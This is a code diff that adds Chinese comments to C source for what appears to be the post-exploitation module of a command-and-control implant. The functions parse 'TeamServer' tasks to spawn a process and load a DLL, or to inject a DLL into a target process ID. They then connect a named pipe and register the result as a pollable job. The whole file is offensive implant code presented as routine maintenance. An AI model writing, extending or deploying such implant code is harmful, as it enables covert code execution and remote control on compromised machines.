@@ -1,5 +1,6 @@
 #include "postex_internal.h"
 
+/* 初始化 PostEx 启动请求默认值。 */
 static VOID PostExInitStartRequest(PostExStartRequest* req)
 {
     if (!req) return;
@@ -8,6 +9,7 @@ static VOID PostExInitStartRequest(PostExStartRequest* req)
     BbInit(&req->dll);
 }
 
+/* 释放 PostEx 启动请求持有的 DLL 缓冲区。 */
 static VOID PostExFreeStartRequest(PostExStartRequest* req)
 {
     if (!req) return;
@@ -15,6 +17,7 @@ static VOID PostExFreeStartRequest(PostExStartRequest* req)
     ZeroMemory(req, sizeof(*req));
 }
 
+/* 复制可选字符串参数并生成字段化错误。 */
 static BOOL PostExCopyArg(CHAR* dst, SIZE_T dst_size, const CHAR* src,
                           const CHAR* name, CHAR* err, SIZE_T err_size)
 {
@@ -42,6 +45,7 @@ static BOOL PostExCopyArg(CHAR* dst, SIZE_T dst_size, const CHAR* src,
     return TRUE;
 }
 
+/* 解析 spawn-dll 请求参数。 */
 static BOOL PostExParseSpawnRequest(struct BeaconContext* ctx, UINT32 task_id,
                                     Parser* parser, PostExStartRequest* req,
                                     CHAR* err, SIZE_T err_size)
@@ -57,6 +61,7 @@ static BOOL PostExParseSpawnRequest(struct BeaconContext* ctx, UINT32 task_id,
         return PostExSetError(err, err_size, "invalid postex spawn request");
     }
 
+    /* wire 参数顺序必须和 TeamServer 下发格式保持一致。 */
     req->task_id = task_id;
     req->subcmd = POSTEX_SUBCMD_SPAWN_DLL;
     req->owns_process = TRUE;
@@ -93,6 +98,7 @@ static BOOL PostExParseSpawnRequest(struct BeaconContext* ctx, UINT32 task_id,
     return ok && !PostExHasError(err);
 }
 
+/* 解析 inject-dll 请求参数。 */
 static BOOL PostExParseInjectRequest(struct BeaconContext* ctx, UINT32 task_id,
                                      Parser* parser, PostExStartRequest* req,
                                      CHAR* err, SIZE_T err_size)
@@ -106,6 +112,7 @@ static BOOL PostExParseInjectRequest(struct BeaconContext* ctx, UINT32 task_id,
         return PostExSetError(err, err_size, "invalid postex inject request");
     }
 
+    /* inject 请求不创建宿主进程，只需要目标 PID。 */
     req->task_id = task_id;
     req->subcmd = POSTEX_SUBCMD_INJECT_DLL;
     req->wait_ms = ParserU32(parser);
@@ -134,6 +141,7 @@ static BOOL PostExParseInjectRequest(struct BeaconContext* ctx, UINT32 task_id,
     return ok && !PostExHasError(err);
 }
 
+/* 校验 PostEx 启动请求的必要字段。 */
 static BOOL PostExValidateStartRequest(const PostExStartRequest* req,
                                        CHAR* err, SIZE_T err_size)
 {
@@ -156,6 +164,7 @@ static BOOL PostExValidateStartRequest(const PostExStartRequest* req,
     return TRUE;
 }
 
+/* 构建 pipe 连接失败时的诊断返回。 */
 static ByteBuf PostExPipeConnectFailed(const PostExStartRequest* req,
                                        PostExStartResult* result)
 {
@@ -174,10 +183,11 @@ static ByteBuf PostExPipeConnectFailed(const PostExStartRequest* req,
 
     BbInit(&out);
     BbPrintf(&out, "postex pipe connect failed: %lu (%s; %s)",
-             (unsigned long)err, thread_status, config_status);
+             (ULONG)err, thread_status, config_status);
     return out;
 }
 
+/* 启动远端 PostEx 后端、连接 pipe 并注册 job。 */
 static ByteBuf PostExRunRemoteRequest(struct BeaconContext* ctx,
                                       PostExStartRequest* req)
 {
@@ -199,6 +209,7 @@ static ByteBuf PostExRunRemoteRequest(struct BeaconContext* ctx,
         return BbFromText(errbuf[0] ? errbuf : "postex remote start failed");
     }
 
+    /* 后端启动成功后，pipe 连接成功才注册为可轮询 job。 */
     if (!PostExConnectPipe(req->pipe_name, &pipe)) {
         return PostExPipeConnectFailed(req, &result);
     }
@@ -207,6 +218,7 @@ static ByteBuf PostExRunRemoteRequest(struct BeaconContext* ctx,
     return PostExRegisterStartedJob(ctx, req, pipe, &result);
 }
 
+/* spawn-dll 子命令入口。 */
 ByteBuf PostExSpawnDll(struct BeaconContext* ctx, UINT32 task_id, Parser* parser)
 {
     PostExStartRequest req;
@@ -223,6 +235,7 @@ ByteBuf PostExSpawnDll(struct BeaconContext* ctx, UINT32 task_id, Parser* parser
     return out;
 }
 
+/* inject-dll 子命令入口。 */
 ByteBuf PostExInjectDll(struct BeaconContext* ctx, UINT32 task_id, Parser* parser)
 {
     PostExStartRequest req;
